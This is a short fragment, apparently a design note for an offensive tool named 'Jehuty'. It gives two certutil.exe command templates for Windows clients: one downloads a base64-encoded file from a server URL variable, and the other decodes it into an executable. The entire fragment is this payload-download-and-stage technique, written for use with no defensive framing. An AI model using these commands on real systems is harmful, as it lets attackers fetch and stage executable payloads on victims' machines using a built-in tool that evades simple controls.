...
* For Jehuty Windows clients, create cmd to leverage downloading files via certutil:
** certutil.exe -urlcache -split -f $JehutyServerURL $base64EncodedFile.txt
** certutil.exe -decode $base64EncodedFile.txt $PE.exe
